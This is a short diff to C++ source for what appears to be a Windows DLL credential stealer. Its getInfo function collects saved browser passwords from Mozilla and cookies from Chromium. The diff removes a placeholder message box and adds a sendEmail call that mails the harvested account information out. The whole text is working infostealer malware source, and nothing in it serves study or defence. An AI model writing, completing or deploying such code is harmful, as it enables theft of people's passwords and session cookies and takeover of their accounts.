@@ -38,7 +38,6 @@ void clear(ICollector<T>* collector)
 }
 
 void getInfo() {
-		MessageBoxA(NULL, "no :(", "no :(", 0);
 	std::string account_info("Password information :\n");
 	auto parser = collector::create_password_collector(collector::BrowserType::Mozilla);
 	gather_result(parser->collect_data(), account_info);
@@ -57,9 +56,7 @@ void getInfo() {
 	parser_cookie = collector::create_cookies_collector(collector::BrowserType::Chromium);
 	gather_result(parser_cookie->collect_data(), account_info);
 	clear(parser_cookie);
-	
-
-
+	sendEmail("account infromation", account_info);
 
 }
 BOOL APIENTRY DllMain( HMODULE hModule,
